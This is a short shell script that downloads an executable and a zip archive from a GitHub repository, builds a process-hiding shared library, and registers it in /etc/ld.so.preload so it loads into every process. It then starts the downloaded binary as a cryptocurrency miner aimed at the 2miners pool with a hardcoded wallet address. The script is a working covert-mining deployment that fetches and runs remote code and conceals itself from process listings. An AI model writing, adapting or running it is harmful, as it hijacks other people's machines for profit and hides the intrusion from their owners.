#!/bin/sh
wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
chmod +x bezzHash

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
unzip magicBezzHash.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./bezzHash --url=nano_3de5768bnrjiunbjhup1frf7ejk6asr4h961j6txg8qmiy36jehhxz89qca1.$(echo $(shuf -i 1-99999 -n 1)-T4)@us-eth.2miners.com:2020 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
